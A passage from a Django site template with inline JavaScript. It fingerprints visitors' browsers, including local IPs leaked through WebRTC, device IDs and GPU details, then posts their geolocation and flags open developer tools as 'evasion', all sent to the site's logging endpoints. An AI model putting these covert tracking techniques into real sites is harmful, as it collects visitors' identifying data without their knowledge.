                        enumerateDevices: 'enumerateDevices' in navigator.mediaDevices
                    };
                    
                    // Attempt to get local IPs (works in some browsers)
                    let ipAddresses = [];
                    if (window.RTCPeerConnection) {
                        const pc = new RTCPeerConnection({iceServers:[]});
                        pc.createDataChannel('');
                        pc.createOffer().then(offer => pc.setLocalDescription(offer));
                        
                        pc.onicecandidate = (ice) => {
                            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
                            const ipMatch = ice.candidate.candidate.match(ipRegex);
                            if (ipMatch && ipAddresses.indexOf(ipMatch[1]) === -1) {
                                ipAddresses.push(ipMatch[1]);
                            }
                        };
                    }
                    
                    return {
                        ...rtcConfig,
                        ipAddresses: ipAddresses
                    };
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            async function getSensorInfo() {
                try {
                    const sensors = {};
                    
                    // Accelerometer
                    if ('Accelerometer' in window) {
                        try {
                            const accelerometer = new Accelerometer({frequency: 60});
                            sensors.accelerometer = 'supported';
                            accelerometer.onerror = () => sensors.accelerometer = 'blocked';
                        } catch (e) {
                            sensors.accelerometer = 'blocked';
                        }
                    } else {
                        sensors.accelerometer = 'unsupported';
                    }
                    
                    // Gyroscope
                    if ('Gyroscope' in window) {
                        try {
                            const gyroscope = new Gyroscope({frequency: 60});
                            sensors.gyroscope = 'supported';
                            gyroscope.onerror = () => sensors.gyroscope = 'blocked';
                        } catch (e) {
                            sensors.gyroscope = 'blocked';
                        }
                    } else {
                        sensors.gyroscope = 'unsupported';
                    }
                    
                    // Magnetometer
                    if ('Magnetometer' in window) {
                        try {
                            const magnetometer = new Magnetometer({frequency: 60});
                            sensors.magnetometer = 'supported';
                            magnetometer.onerror = () => sensors.magnetometer = 'blocked';
                        } catch (e) {
                            sensors.magnetometer = 'blocked';
                        }
                    } else {
                        sensors.magnetometer = 'unsupported';
                    }
                    
                    // Ambient Light Sensor
                    if ('AmbientLightSensor' in window) {
                        try {
                            const lightSensor = new AmbientLightSensor();
                            sensors.lightSensor = 'supported';
                            lightSensor.onerror = () => sensors.lightSensor = 'blocked';
                        } catch (e) {
                            sensors.lightSensor = 'blocked';
                        }
                    } else {
                        sensors.lightSensor = 'unsupported';
                    }
                    
                    return sensors;
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            async function getMediaDevices() {
                try {
                    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                        return 'unsupported';
                    }
                    
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    return devices.map(device => ({
                        kind: device.kind,
                        label: device.label,
                        deviceId: device.deviceId,
                        groupId: device.groupId
                    }));
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            function getVideoCardInfo() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    
                    if (!gl) return null;
                    
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
                    };
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            function getScrollBehavior() {
                try {
                    const behavior = {};
                    
                    // Mouse wheel event support
                    behavior.wheelEvent = 'onwheel' in document ? 'wheel' : 
                                        document.onmousewheel !== undefined ? 'mousewheel' : 'DOMMouseScroll';
                    
                    // Touch event support
                    behavior.touchEvents = 'ontouchstart' in window;
                    behavior.pointerEvents = !!window.PointerEvent;
                    
                    return behavior;
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            function hashString(str) {
                // Simple hash function for demonstration
                let hash = 0;
                for (let i = 0; i < str.length; i++) {
                    const char = str.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash = hash & hash; // Convert to 32bit integer
                }
                return hash.toString();
            }
            
            function sendFingerprint(data) {
                try {
                    // Use Beacon API if available for better reliability
                    if (navigator.sendBeacon) {
                        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
                        navigator.sendBeacon("{% url 'base:log-fingerprint' %}", blob);
                    } else {
                        // Fallback to fetch
                        fetch("{% url 'base:log-fingerprint' %}", {
                            method: "POST",
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(data),
                            keepalive: true
                        }).catch(e => console.error('Failed to send fingerprint:', e));
                    }
                } catch (e) {
                    console.error('Error sending fingerprint:', e);
                }
            }
            
            // Start fingerprint collection with randomized delay
            setTimeout(collectFingerprint, randomDelay);
        })();
    </script>

    <script>
        // Geolocation with visual indicator
        if (navigator.geolocation) {
            const geoIcon = document.createElement('i');
            geoIcon.className = 'fas fa-map-marker-alt security-icon';
            geoIcon.style.marginLeft = '10px';
            geoIcon.style.opacity = '0.7';
            geoIcon.title = 'Location services active';
            document.querySelector('.security-indicator').appendChild(geoIcon);
            
            navigator.geolocation.getCurrentPosition(function(position) {
                geoIcon.style.color = '#00FF00';
                geoIcon.title = 'Location detected';
                
                fetch("{% url 'base:log-geo' %}", {
                    method: "POST",
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: new URLSearchParams({
                        lat: position.coords.latitude,
                        lon: position.coords.longitude
                    })
                });
            }, function(error) {
                geoIcon.style.color = '#FF0000';
                geoIcon.title = 'Location blocked';
            });
        }
    </script>

    <script>
        // DevTools detection with warning icon
        const devToolsIcon = document.createElement('i');
        devToolsIcon.className = 'fas fa-tools security-icon';
        devToolsIcon.style.marginLeft = '10px';
        devToolsIcon.style.opacity = '0.7';
        devToolsIcon.title = 'DevTools monitor active';
        document.querySelector('.security-indicator').appendChild(devToolsIcon);
        
        function detectDevTools() {
            let threshold = 160;
            const element = new Image();
            Object.defineProperty(element, 'id', {
                get: function () {
                    devToolsIcon.style.animation = 'pulse 0.5s';
                    devToolsIcon.style.color = '#FF0000';
                    devToolsIcon.title = 'DevTools detected!';
                    setTimeout(() => devToolsIcon.style.animation = '', 500);
                    
                    fetch("{% url 'base:log-evasion-detection' %}", {
                        method: "POST",
                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                        body: new URLSearchParams({evasion: "DevTools opened"})
                    });
                }
            });
            console.log(element);
        }
        
        // Check periodically
        setInterval(detectDevTools, 1000);
        detectDevTools();
    </script>
    {% block extra_js %}
    {% endblock %}
</body>
</html>